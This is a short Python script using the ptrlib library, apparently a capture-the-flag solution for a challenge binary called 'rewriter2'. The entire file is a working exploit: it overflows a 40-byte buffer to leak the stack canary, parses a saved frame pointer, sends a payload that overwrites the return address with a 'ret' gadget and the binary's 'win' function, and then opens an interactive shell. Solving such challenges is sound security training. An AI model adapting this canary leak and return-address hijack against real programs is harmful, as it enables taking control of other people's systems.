#!/usr/bin/env python
import ptrlib as ptr
import sys

elf = ptr.ELF("./rewriter2")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("localhost", 5000)
    else:
        return ptr.Process(elf.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    io.sendline(b"A" * 40)
    io.recvuntil(b"A" * 40 + b"\n")
    canary = ptr.u64(b"\x00" + io.recv(7))

    io.recvuntil(b"canary\n")
    rbp = int(
        io.recvuntil(b"  <- saved rbp")
        .strip(b"  <- saved rbp")
        .split(b" | ")[1]
        .split(b"0x")[1],
        16,
    )
    print(hex(rbp))

    payload = b""
    payload += b"A" * 40
    payload += ptr.p64(canary)
    payload += ptr.p64(rbp)
    payload += ptr.p64(next(elf.gadget("ret;")))
    payload += ptr.p64(unwrap(elf.symbol("win")))
    io.sendline(payload)

    io.sh()


if __name__ == "__main__":
    main()
